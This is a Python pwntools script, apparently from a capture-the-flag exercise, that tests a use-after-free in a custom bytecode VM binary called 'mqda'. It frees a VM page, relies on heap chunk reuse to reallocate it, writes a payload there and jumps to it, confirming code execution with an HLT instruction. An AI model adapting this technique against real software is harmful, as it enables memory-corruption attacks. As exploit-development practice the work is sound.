#!/usr/bin/env python3
"""
UAF with same address:
1. Free page at 0x10000
2. Allocate NEW page at 0x10000 again (should reuse same chunk!)
3. Write controlled data to 0x10000
4. Jump to 0x10000 -> executes our controlled code!

Wait - if we allocate at 0x10000 again, get_page will:
- Check page table for 0x10000
- Page table entry was cleared when freed
- Allocate new page with malloc(0x104)
- This might reuse the freed chunk!
- Write new address header
- Store in page table

Then our writes go to the new page, and execution reads from it!
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def jmp_reg(reg):
    return bytes([0x0E, reg])

def push_reg(reg):
    return bytes([0x02, reg])

code_addr1 = 0x10000
code_addr2 = 0x10100

# Stage 1: Jump to safe code
code1 = b''
code1 += mov_reg_imm(0, code_addr2)
code1 += jmp_reg(0)
code1 = code1.ljust(256, b'\xff')

# Stage 2: Zero page 0x10000, then write new code to it, then jump back
code2 = b''

# Zero page 0x10000 to trigger cleanup (free)
for offset in range(0, 256, 4):
    sp = 0x10000 | offset
    code2 += mov_reg_imm(15, sp)
    code2 += mov_reg_imm(0, 0)
    code2 += push_reg(0)

# Now page 0x10000 is freed
# Write new code to 0x10000 - this should trigger get_page to allocate new page
# The new allocation SHOULD reuse the just-freed chunk (tcache)

# Our payload: a simple HLT
# payload[0] = 0x00 (mode 0, opcode 0 = HLT)
payload = b'\x00\x00\x00\x00'  # HLT

# Write payload to 0x10000
for i in range(0, 4, 4):
    sp = 0x10000 | i
    code2 += mov_reg_imm(15, sp)
    code2 += mov_reg_imm(0, u32(payload[i:i+4]))
    code2 += push_reg(0)

# Jump back to 0x10000
code2 += mov_reg_imm(0, code_addr1)
code2 += jmp_reg(0)
code2 += hlt()

code2 = code2.ljust(256, b'\xff')

full_code = code1 + code2

print(f"[*] Total code: {len(full_code)} bytes")

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr1).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(full_code)).encode())
p.recvuntil(b'Code> ')
p.send(full_code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr1).encode())

output = p.recvall(timeout=3)
print(f"Output: {output}")

if b'TERMINATED' in output:
    print("[+] HLT executed! UAF code execution works!")
elif b'NORMAL' in output:
    print("[+] Normal exit - code executed successfully")
else:
    print("[*] Other result")

p.close()
